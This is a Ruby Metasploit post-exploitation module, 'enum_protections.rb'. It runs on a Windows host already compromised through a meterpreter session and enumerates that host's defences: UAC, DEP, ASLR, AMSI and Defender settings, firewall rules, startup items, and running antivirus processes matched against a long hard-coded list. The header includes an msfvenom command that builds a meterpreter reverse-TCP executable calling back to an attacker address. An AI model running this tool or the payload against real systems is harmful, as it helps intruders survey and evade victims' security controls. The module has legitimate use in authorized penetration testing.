##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enum_protections.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Affected system: Windows (all)
# "Rapid7 as deprecated  meterpreter scripts like 'getcontrameasures.rb' by @darkoperator
# This metasploit post-module replaces getcontrameasures meterpreter script by one post-module
# with updated exploit protection/enumeration querys"
#
#
# [ DESCRIPTION ]
# This post-module enumerates AV(s) process names active on remote task manager (windows platforms).
# Displays process name(s), pid(s) and process absoluct path(s), query remote UAC settings, DEP Policy settings,
# ASLR settings, AMSI settings, Exploit Prevention settings, startup processes, Built-in firewall settings,
# and stores results into ~/.msf4/loot directory (set STORE_LOOT true).
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on  => set SESSION 1
# Display enum_protections module banner?   => set BANNER false
# Store session logfiles (local PC)         => set STORE_LOOT true
# Query for all firewall rules?             => set GET_RULES true
# Query for all amsi rules?                 => set AMSI_RULES true
#
#
# [ PORT MODULE TO METASPLOIT DATABASE (execute in terminal) ]
# path=$(locate modules/post/windows/recon | grep -v '\doc' | grep -v '\documentation' | head -n 1)
# sudo cp enum_protections.rb $path/enum_protections.rb
#
#
# [ RELOAD MSF DATABASE (execute in terminal) ]
# sudo service postgresql start && msfdb reinit
# sudo msfconsole -x 'db_status;reload_all;exit -y'
#
#
# [ BUILD PAYLOAD TO TEST MODULE ]
# sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -f exe -o binary.exe
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > use post/windows/recon/enum_protections
# msf post(windows/recon/enum_protections) > info
# msf post(windows/recon/enum_protections) > show options
# msf post(windows/recon/enum_protections) > show advanced options
# msf post(windows/recon/enum_protections) > set [option(s)]
# msf post(windows/recon/enum_protections) > exploit
##



## Metasploit libraries
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'


## Metasploit Class name and mixins
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry


        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'Windows Exploit Protection Enumeration',
                        'Description'   => %q{
                                        This post-module enumerates AV(s) process names active on remote task manager (windows platforms). Displays process name(s), pid(s) and process absoluct path(s), query remote UAC settings, DEP Policy settings, ASLR settings, AMSI settings, Exploit Prevention settings, startup processes, Built-in firewall settings, and stores results into ~/.msf4/loot directory (set STORE_LOOT true).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'r00t-3xp10it <pedroubuntu10[at]gmail.com>',
                                ],
 
                        'Version'        => '$Revision: 1.8',
                        'DisclosureDate' => '26 03 2019',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # Thats no need for privilege escalation.
                        'Targets'        =>
                                [
                                         # Affected systems are.
                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '6', # Default its to run againts windows 10
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'http://rapid7.github.io/metasploit-framework/api/' ]


                                ],
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptBool.new('BANNER', [ false, 'Display enum_protections module banner?', true]),
                                OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
                                OptBool.new('STORE_LOOT', [ false, 'Store results in loot folder (logfile)?', false])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('GET_RULES', [ false, 'Query for all firewall rules?', false]),
                                OptBool.new('AMSI_RULES', [ false, 'Query for all amsi rules?', false])
                        ], self.class)

        end



def run
  session = client
  ## Variable declarations (API calls)
  sysnfo = session.sys.config.sysinfo
  runtor = client.sys.config.getuid
  runsession = client.session_host
  directory = client.fs.dir.pwd


  ## POST MODULE BANNER (set BANNER true)
  if datastore['BANNER'] == true
     print_line("    +--------------------------------------------+")
     print_line("    |     ENUMERATE PROTECTIONS ON REMOTE PC     |")
     print_line("    |        Author : r00t-3xp10it (SSA)         |")
     print_line("    +--------------------------------------------+")
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
     print_line("    Architecture        : #{sysnfo['Architecture']}")
     print_line("    Computer            : #{sysnfo['Computer']}")
     print_line("    Target IP addr      : #{runsession}")
     print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Payload directory   : #{directory}")
     print_line("    Client UID          : #{runtor}")
     print_line("")
     print_line("")
  end
  print_status("Enumerating #{runsession} remote protections")
  Rex::sleep(1.5)

     ## check for proper operative system
     unless sysinfo['OS'] =~ /Windows/i
        print_error("[ABORT]: This module only works againts windows systems.")
        return nil
     end

    ## check for proper session.
    if sysinfo.nil? or sysinfo == ''
       print_error("ABORT]: This post-module only works in meterpreter sessions")
       return nil
    end


     av_list = []
     data_dump=''
     print_line("")
     print_line("")
     print_line("Exploit Protection")
     print_line("------------------")
     data_dump << "\nExploit Protection\n"
     data_dump << "------------------\n"
     ## Query UAC remote settings (regedit)
     uac_check = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA")
     reg_key = registry_getvaldata("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","ConsentPromptBehaviorAdmin")

        ## determining UAC status/level
        if uac_check == 1
           print_line("UAC status               : Enable")
           data_dump << "UAC status               : Enable\n"
        else
           print_line("UAC status               : Disable")
           data_dump << "UAC status               : Disable\n"
        end

        if reg_key == 0
           print_line("Level Description        : Elevation without consent")
           data_dump << "Level Description        : Elevation without consent\n"
        elsif reg_key == 1
           print_line("Level Description        : enter username and password when operations require elevated privileges")
           data_dump << "Level Description        : enter username and password when operations require elevated privileges\n"
        elsif reg_key == 2
           print_line("Level Description        : displays the UAC prompt that needs to be permitted or denied on a secure desktop")
           data_dump << "Level Description        : displays the UAC prompt that needs to be permitted or denied on a secure desktop\n"
        elsif reg_key == 3
           print_line("Level Description        : prompts for credentials.")
           data_dump << "Level Description        : prompts for credentials.\n"
        elsif reg_key == 4
           print_line("Level Description        : prompts for consent by displaying the UAC prompt")
           data_dump << "Level Description        : prompts for consent by displaying the UAC prompt\n"
        elsif reg_key == 5
           print_line("Level Description        : prompts for consent for non-Windows binaries")
           data_dump << "Level Description        : prompts for consent for non-Windows binaries\n"
        else
           print_line("Level Description        : #{reg_key}")
           data_dump << "Level Description        : #{reg_key}\n"
        end


     depmode = ""
     depstatus = ""
     ## Query DEP (Data Execution Prevention) settings
     depmode = cmd_exec("wmic OS Get DataExecutionPrevention_SupportPolicy")
     depstatus = cmd_exec("wmic OS Get DataExecutionPrevention_Available")

        ## Determining DEP status/level
        if depstatus =~ /TRUE/
           print_line("DEP status               : Enable")
           data_dump << "DEP status               : Enable\n"
        else
           print_line("DEP status                     : Disable")
           data_dump << "DEP status                     : Disable\n"
        end

        if depmode =~ /0/
           print_line("Level Description        : DEP is off for the whole system.")
           data_dump << "Level Description        : DEP is off for the whole system.\n"
        elsif depmode =~ /1/
           print_line("Level Description        : Full DEP coverage for the whole system with no exceptions.")
           data_dump << "Level Description        : Full DEP coverage for the whole system with no exceptions.\n"
        elsif depmode =~ /2/
           print_line("Level Description        : DEP is limited to Windows system binaries.")
           data_dump << "Level Description        : DEP is limited to Windows system binaries.\n"
        elsif depmode =~ /3/
           print_line("Level Description        : DEP is on for all programs and services.")
           data_dump << "Level Description        : DEP is on for all programs and services.\n"
        else
           print_line("Level Description        : #{depmode}")
           data_dump << "Level Description        : #{depmode}\n"
        end


        ## Query for Exploit protection/ASLR settings
        # HINT: 11 12 12 00 00 01 00 00 00 00 00 00 00 00 00 00 = All 3 ASLR windows defender funtions stoped
        aslr_check = cmd_exec("reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel\" /v MitigationOptions")
        aslr_error = registry_getvalinfo("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\kernel","MitigationOptions")
        # aslr: {"Data"=>"!!\x11\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00", "Type"=>3}
        ## All definitions [Exploit protection] turn on
        if aslr_check =~ /11111100000100000000000000000000/
           print_line("Exploit protection       : Enable")
           data_dump << "Exploit protection       : Enable\n"
           print_line("Level Description        : Active for all definitions")
           data_dump << "Level Description        : Active for all definitions\n"
        ## All definitions [Exploit protection] turn off
        elsif aslr_check =~ /22222200000200000002000000000000/
           print_line("Exploit protection       : Disable")
           data_dump << "Exploit protection       : Disable\n"
           print_line("Level Description        : Disable for all definitions")
           data_dump << "Level Description        : Disable for all definitions\n"
        ## ASLR and DEP turn off
        elsif aslr_check =~ /12122200000100000000000000000000/
           print_line("ASLR and DEP             : Disable")
           data_dump << "ASLR and DEP             : Disable\n"
           print_line("Level Description        : Disable for all 4 definitions")
           data_dump << "Level Description        : Disable for all 4 definitions\n"
        ## ASLR definition [mandatory process] turn off
        elsif aslr_check =~ /11121100000100000000000000000000/
           print_line("ASLR status              : Disable")
           data_dump << "ASLR status              : Disable\n"
           print_line("Level Description        : ASLR its disable (Mandatory Processes")
           data_dump << "Level Description        : ASLR its disable (Mandatory Processes\n"
        ## ASLR definition [Ascending ASLR] turn off
        elsif aslr_check =~ /11111200000100000000000000000000/
           print_line("ASLR status              : Disable")
           data_dump << "ASLR status              : Disable\n"
           print_line("Level Description        : ASLR its disable (Ascending ASLR)")
           data_dump << "Level Description        : ASLR its disable (Ascending ASLR)\n"
        ## ASLR definition [all 3 ASLR functions] turn off
        elsif aslr_check =~ /11122200000100000000000000000000/
           print_line("ASLR status              : Disable")
           data_dump << "ASLR status              : Disable\n"
           print_line("Level Description        : ASLR its disable (all 3 ASLR functions)")
           data_dump << "Level Description        : ASLR its disable (all 3 ASLR functions)\n"
        else
           ## Unknow comparition data
           print_line("Exploit protection       : Unknown")
           data_dump << "Exploit protection       : Unknown\n"
           print_line("Level Description        : #{aslr_error}")
           data_dump << "Level Description        : #{aslr_error}\n"
        end


        ## Query for Windows Defender version (powershell)
        wd_ver = cmd_exec("powershell -C \"(Get-Command C:\\'Program Files'\\'Windows Defender'\\MsMpEng.exe).FileVersionInfo.FileVersion\"")
        parse_ver = wd_ver.split(' ')[0]
        print_line("AMSI executable version    : #{parse_ver}")
        data_dump << "AMSI executable version    : #{parse_ver}\n"


        ## Query for AMSI (anti-mallware-system-interface) rules
        amsi_script = cmd_exec("powershell -C \"MpPreference | Select DisableScriptScanning\"")       # false
        amsi_behavior = cmd_exec("powershell -C \"MpPreference | Select DisableBehaviorMonitoring\"") # false
        amsi_realtime = cmd_exec("powershell -C \"MpPreference | Select DisableRealtimeMonitoring\"") # false

           ## Determining AMSI status/level
           if amsi_script =~ /false/i
              print_line("AMSI ScriptScanning      : Enable")
              data_dump << "AMSI ScriptScanning      : Enable\n"
           elsif amsi_script =~ /true/i
              print_line("AMSI ScriptScanning      : Disable")
              data_dump << "AMSI ScriptScanning      : Disable\n"
           else
              print_line("AMSI ScriptScanning      :")
              data_dump << "AMSI ScriptScanning      :\n"
           end

           if amsi_behavior =~ /false/i
              print_line("AMSI BehaviorMonitoring  : Enable")
              data_dump << "AMSI BehaviorMonitoring  : Enable\n"
           elsif amsi_behavior =~ /true/i
              print_line("AMSI BehaviorMonitoring  : Disable")
              data_dump << "AMSI BehaviorMonitoring  : Disable\n"
           else
              print_line("AMSI BehaviorMonitoring  :")
              data_dump << "AMSI BehaviorMonitoring  :\n"
           end

           if amsi_realtime =~ /false/i
              print_line("AMSI RealtimeMonitoring  : Enable")
              data_dump << "AMSI RealtimeMonitoring  : Enable\n"
           elsif amsi_realtime =~ /true/i
              print_line("AMSI RealtimeMonitoring  : Disable")
              data_dump << "AMSI RealtimeMonitoring  : Disable\n"
           else
              print_line("AMSI RealtimeMonitoring  :")
              data_dump << "AMSI RealtimeMonitoring  :\n"
           end


        Rex::sleep(1.0)
        print_line("")
        print_line("")
        print_line("Installed AV(s)")
        print_line("---------------")
        ## AV Install detection function (powershell command)
        av_install = cmd_exec("Powershell.exe Get-CimInstance -ClassName AntivirusProduct -NameSPace root\\securitycenter2")
        print_line(av_install)
        data_dump << "\n\n"
        ## Store captured data in 'data_dump'
        data_dump << "Installed AV\n"
        data_dump << "------------\n"
        data_dump << "#{av_install}"


## List of AVs process names
av_list = %W{
  a2adguard.exe
  a2adwizard.exe
  a2antidialer.exe
  a2cfg.exe
  a2cmd.exe
  a2free.exe
  a2guard.exe
  a2hijackfree.exe
  a2scan.exe
  a2service.exe
  a2start.exe
  a2sys.exe
  a2upd.exe
  aavgapi.exe
  aawservice.exe
  aawtray.exe
  ad-aware.exe
  ad-watch.exe
  alescan.exe
  anvir.exe
  ashdisp.exe
  ashmaisv.exe
  ashserv.exe
  ashwebsv.exe
  aswupdsv.exe
  atrack.exe
  avast.exe
  avgagent.exe
  avgamsvr.exe
  avgcc.exe
  avgctrl.exe
  avgemc.exe
  avgnt.exe
  avgtcpsv.exe
  avguard.exe
  avgupsvc.exe
  avgw.exe
  avkbar.exe
  avk.exe
  avkpop.exe
  avkproxy.exe
  avkservice.exe
  avktray
  avktray.exe
  avkwctl
  avkwctl.exe
  avmailc.exe
  avp.exe
  avpm.exe
  avpui.exe
  avpmwrap.exe
  avsched32.exe
  avwebgrd.exe
  avwin.exe
  avwupsrv.exe
  avz.exe
  bdagent.exe
  bdmcon.exe
  bdnagent.exe
  bdss.exe
  bdswitch.exe
  blackd.exe
  blackice.exe
  blink.exe
  boc412.exe
  boc425.exe
  bocore.exe
  bootwarn.exe
  cavrid.exe
  cavtray.exe
  ccapp.exe
  ccevtmgr.exe
  ccimscan.exe
  ccproxy.exe
  ccpwdsvc.exe
  ccpxysvc.exe
  ccsetmgr.exe
  cfgwiz.exe
  cfp.exe
  clamd.exe
  clamservice.exe
  clamtray.exe
  cmdagent.exe
  cpd.exe
  cpf.exe
  csinsmnt.exe
  dcsuserprot.exe
  defensewall.exe
  defensewall_serv.exe
  defwatch.exe
  f-agnt95.exe
  fpavupdm.exe
  f-prot95.exe
  f-prot.exe
  fprot.exe
  fsaua.exe
  fsav32.exe
  f-sched.exe
  fsdfwd.exe
  fsm32.exe
  fsma32.exe
  fssm32.exe
  f-stopw.exe
  f-stopw.exe
  fwservice.exe
  fwsrv.exe
  iamstats.exe
  iao.exe
  icload95.exe
  icmon.exe
  idsinst.exe
  idslu.exe
  inetupd.exe
  irsetup.exe
  isafe.exe
  isignup.exe
  issvc.exe
  kav.exe
  kavss.exe
  kavsvc.exe
  klswd.exe
  ksdeui.exe
  kpf4gui.exe
  kpf4ss.exe
  livesrv.exe
  lpfw.exe
  mcagent.exe
  mcdetect.exe
  mcmnhdlr.exe
  mcrdsvc.exe
  mcshield.exe
  mctskshd.exe
  mcvsshld.exe
  mccspservicehost.exe
  msmpeng.exe
  mghtml.exe
  mpftray.exe
  msascui.exe
  mscifapp.exe
  msfwsvc.exe
  msgsys.exe
  msssrv.exe
  navapsvc.exe
  navapw32.exe
  navlogon.dll
  navstub.exe
  navw32.exe
  nisemsvr.exe
  nisum.exe
  nmain.exe
  noads.exe
  nod32krn.exe
  nod32kui.exe
  nod32ra.exe
  npfmntor.exe
  nprotect.exe
  nsmdtr.exe
  oasclnt.exe
  ofcdog.exe
  opscan.exe
  ossec-agent.exe
  outpost.exe
  paamsrv.exe
  pavfnsvr.exe
  pcclient.exe
  pccpfw.exe
  pccwin98.exe
  persfw.exe
  pefservice.exe
  protector.exe
  qconsole.exe
  qdcsfs.exe
  rtvscan.exe
  sadblock.exe
  safe.exe
  sandboxieserver.exe
  savscan.exe
  sbiectrl.exe
  sbiesvc.exe
  sbserv.exe
  scfservice.exe
  sched.exe
  schedm.exe
  scheduler daemon.exe
  sdhelp.exe
  serv95.exe
  securityhealthservice.exe
  sgbhp.exe
  sgmain.exe
  slee503.exe
  smartfix.exe
  smc.exe
  snoopfreesvc.exe
  snoopfreeui.exe
  spbbcsvc.exe
  sp_rsser.exe
  spyblocker.exe
  spybotsd.exe
  spysweeper.exe
  spysweeperui.exe
  spywareguard.dll
  spywareterminatorshield.exe
  ssu.exe
  steganos5.exe
  stinger.exe
  swdoctor.exe
  swupdate.exe
  symlcsvc.exe
  symundo.exe
  symwsc.exe
  symwscno.exe
  tcguard.exe
  tds2-98.exe
  tds-3.exe
  teatimer.exe
  tgbbob.exe
  tgbstarter.exe
  tsatudt.exe
  umxagent.exe
  umxcfg.exe
  umxfwhlp.exe
  umxlu.exe
  umxpol.exe
  umxtray.exe
  usrprmpt.exe
  vetmsg9x.exe
  vetmsg.exe
  vptray.exe
  vsaccess.exe
  vsserv.exe
  wcantispy.exe
  win-bugsfix.exe
  winpatrol.exe
  winpatrolex.exe
  wrsssdk.exe
  xcommsvr.exe
  xfr.exe
  xp-antispy.exe
  zegarynka.exe
  zlclient.exe
}


     Rex::sleep(1.0)
     print_line("Task Manager Processes")
     print_line("----------------------")
     data_dump << "Task Manager Processes\n"
     data_dump << "----------------------\n"
     ## Query target task manager for AV process names
     session.sys.process.get_processes().each do |x|
        if (av_list.index(x['name'].downcase))
           ## Query x['name'] version using powershell
           psh_ver = cmd_exec("powershell -C \"(Get-Command '#{x['path']}').FileVersionInfo.FileVersion\"")
           app_ver = psh_ver.split(' ')[0]
           if app_ver.include? ","
              parse = app_ver.gsub(",", ".")
              app_ver = "#{parse}"
           end
              ch_path = "#{x['path']}"
              print_line("Process PID              : #{x['pid']}")
              data_dump << "Process PID              : #{x['pid']}\n"
              print_line("Display Name             : #{x['name']}")
              data_dump << "Display Name             : #{x['name']}\n"
                 ## appl_ver function requires x['path'] local var
                 if ch_path.nil? or ch_path == ''
                    print_line("Process Path             :")
                    data_dump << "Process Path             :\n"
                    print_line("Appl version             :")
                    data_dump << "Appl version             :\n"
                 else
                    print_line("Process Path             : #{x['path']}")
                    data_dump << "Process Path             : #{x['path']}\n"
                    print_line("Appl version             : #{app_ver}")
                    data_dump << "Appl version             : #{app_ver}\n"
                 end
              print_line("")
        end
     end



     wmic_scan = ""
     Rex::sleep(1.0)
     print_line("")
     print_line("")
     print_line("Startup Processes")
     print_line("-----------------")
     ## Get all startup processes
     wmic_scan = cmd_exec("wmic startup get Caption, Command")
     print_line(wmic_scan)

     data_dump << "\n\n"
     ## Store captured data in 'data_dump'
     data_dump << "Startup Processes\n"
     data_dump << "-----------------\n"
     data_dump << "#{wmic_scan}"


     output = ""
     Rex::sleep(1.0)
     print_line("")
     ## Get the configurations of the built-in Windows Firewall
     output = cmd_exec("netsh advfirewall show allprofiles")
     parse = output.slice(0..-6)
     print_line(parse)

     data_dump << "\n\n"
     ## Store captured data in 'data_dump'
     data_dump << "#{parse}\n"


     ## Get ALL the configurations of the built-in Windows Firewall
     if datastore['GET_RULES'] == true
        print_line("")
        print_line("NetFirewallRules")
        print_line("----------------")
        net_rules = cmd_exec("powershell.exe -C \"Get-NetFirewallRule -All\"")
        print_line(net_rules)

        ## Store captured data in 'data_dump'
        data_dump << "\n\n"
        data_dump << "NetFirewallRules\n"
        data_dump << "----------------\n"
        data_dump << "#{net_rules}\n"
     end


     ## Get ALL the configurations of AMSI
     if datastore['AMSI_RULES'] == true
        print_line("")
        print_line("AMSI Rules")
        print_line("----------")
        amsi_rules = cmd_exec("powershell.exe -C \"MpPreference\"")
        print_line(amsi_rules)

        ## Store captured data in 'data_dump'
        data_dump << "\n\n"
        data_dump << "AMSI Rules\n"
        data_dump << "----------\n"
        data_dump << "#{amsi_rules}\n"
     end

 
     ## Store (data_dump) contents into msf loot folder? (local) ..
     if datastore['STORE_LOOT'] == true
       print_warning("Session logfile stored in: ~/.msf4/loot folder")
       store_loot("enum_protections", "text/plain", session, data_dump, "enum_protections.txt", "enum_protections")
     end
   ## End of the 'def run()' funtion..
   end
end
